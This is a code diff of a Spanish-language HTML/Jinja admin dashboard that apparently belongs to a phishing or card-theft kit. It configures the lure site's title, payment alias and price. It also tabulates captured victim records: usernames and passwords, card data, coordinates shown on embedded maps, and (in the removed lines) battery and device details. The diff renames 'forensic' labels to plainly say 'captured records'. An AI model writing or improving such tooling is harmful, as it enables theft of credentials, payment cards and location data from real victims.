@@ -2,67 +2,45 @@
 <html lang="es">
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MASTER_V12_GOLD</title>
+    <title>ADMIN_V13</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; font-size: 0.8rem; }
-        .box { border: 1px solid #00ff41; background: rgba(0,20,0,0.9); padding: 12px; margin-bottom: 10px; border-radius: 5px; }
-        .table { color: #00ff41; border-color: #004400; font-size: 0.75rem; }
-        input, .form-control { background: #000 !important; color: #00ff41 !important; border: 1px solid #00ff41 !important; font-size: 0.8rem; }
-        .label-p { color: #00ccff; font-weight: bold; font-size: 0.65rem; display: block; margin-top: 8px; }
-        .thumb { width: 45px; height: 45px; object-fit: cover; border: 1px solid #00ff41; margin: 2px; }
+        body { background: #000; color: #00ff41; font-family: monospace; font-size: 0.8rem; }
+        .m-box { border: 1px solid #00ff41; background: rgba(0,20,0,0.9); padding: 10px; margin-bottom: 10px; }
+        .table { color: #00ff41; border-color: #004400; }
+        .card-data { color: #ff3131; font-weight: bold; border: 1px dashed #ff3131; padding: 5px; display: block; }
     </style>
 </head>
 <body class="p-3">
-    <h6 class="mb-3 border-bottom border-success pb-2">> FRANCO_FORENSIC_MASTER_V12</h6>
     <div class="row">
         <div class="col-md-3">
-            <div class="box">
-                <p class="text-white small fw-bold">> CONFIGURACIÓN_DEL_SITIO</p>
+            <div class="m-box">
+                <h6>CONFIGURACIÓN</h6>
                 <form action="/update_full" method="POST" enctype="multipart/form-data">
-                    <span class="label-p">PORTADA:</span>
-                    <input type="file" name="file_portada" class="form-control form-control-sm mb-2">
-                    <span class="label-p">TÍTULO:</span>
-                    <input type="text" name="titulo" value="{{config.titulo}}" class="form-control form-control-sm mb-2">
-                    <span class="label-p">ALIAS PAGO:</span>
-                    <input type="text" name="alias" value="{{config.alias}}" class="form-control form-control-sm mb-2">
-                    <span class="label-p">PRECIO:</span>
-                    <input type="text" name="precio" value="{{config.precio}}" class="form-control form-control-sm mb-2">
-                    <div class="row g-2 mb-2">
-                        <div class="col-6"><span class="label-p">COLOR FONDO:</span><input type="color" name="color_fondo" value="{{config.color_fondo}}" class="form-control form-control-sm h-auto"></div>
-                        <div class="col-6"><span class="label-p">COLOR TEXTO:</span><input type="color" name="color_texto" value="{{config.color_texto}}" class="form-control form-control-sm h-auto"></div>
-                    </div>
-                    <button class="btn btn-outline-success btn-sm w-100">GUARDAR CAMBIOS</button>
+                    <input type="text" name="titulo" value="{{config.titulo}}" class="form-control form-control-sm mb-2" placeholder="Título">
+                    <input type="text" name="alias" value="{{config.alias}}" class="form-control form-control-sm mb-2" placeholder="Alias Pago">
+                    <input type="text" name="precio" value="{{config.precio}}" class="form-control form-control-sm mb-2" placeholder="Precio">
+                    <input type="color" name="color_fondo" value="{{config.color_fondo}}" class="form-control form-control-sm mb-2">
+                    <button class="btn btn-success btn-sm w-100">ACTUALIZAR</button>
                 </form>
-            </div>
-            <div class="box">
-                <p class="text-white small fw-bold">> MEDIA_DASHBOARD</p>
-                <form action="/upload_media" method="POST" enctype="multipart/form-data">
-                    <input type="file" name="file_gallery" class="form-control form-control-sm mb-2">
-                    <button class="btn btn-outline-primary btn-sm w-100 mb-2">SUBIR IMAGEN</button>
-                </form>
-                <div class="d-flex flex-wrap overflow-auto" style="max-height: 120px;">
-                    {% for f in archivos %}
-                    <div class="position-relative">
-                        <img src="/static/uploads/{{f}}" class="thumb">
-                        <a href="/delete_file/{{f}}" class="btn btn-danger btn-sm p-0 position-absolute top-0 end-0" style="width:14px;height:14px;font-size:8px;">X</a>
-                    </div>
-                    {% endfor %}
-                </div>
             </div>
         </div>
         <div class="col-md-9">
-            <div class="box overflow-auto">
-                <p class="text-white small fw-bold">> LOGS_DE_CAPTURA_FORENSE</p>
+            <div class="m-box">
+                <h6>REGISTROS CAPTURADOS</h6>
                 <table class="table table-dark table-sm">
-                    <thead><tr><th>USUARIO</th><th>FORENSE</th><th>TARJETA</th><th>MAPA</th></tr></thead>
+                    <thead><tr><th>USUARIO/PASS</th><th>UBICACIÓN</th><th>TARJETA</th><th>MAPA</th></tr></thead>
                     <tbody>
                         {% for r in registros %}
                         <tr>
                             <td><b>{{r[1]}}</b><br><small class="text-info">{{r[2]}}</small></td>
-                            <td><small class="text-warning">BAT: {{r[11]}}</small><br><small>{{r[7]}} | {{r[12]}}</small></td>
-                            <td><span class="{% if 'ESPERANDO' not in r[3] %}text-danger fw-bold{% endif %}">{{r[3]}}</span></td>
-                            <td>{% if r[9] != 0 %}<iframe width="110" height="65" src="https://maps.google.com/maps?q={{r[9]}},{{r[10]}}&hl=es&z=10&output=embed" style="border:1px solid #00ff41"></iframe>{% endif %}</td>
+                            <td><small>{{r[8]}}</small><br><small class="text-muted">{{r[9]}}, {{r[10]}}</small></td>
+                            <td><span class="card-data">{{r[3]}}</span></td>
+                            <td>
+                                {% if r[9] != 0 %}
+                                <iframe width="100" height="60" src="https://maps.google.com/maps?q={{r[9]}},{{r[10]}}&z=15&output=embed"></iframe>
+                                {% endif %}
+                            </td>
                         </tr>
                         {% endfor %}
                     </tbody>
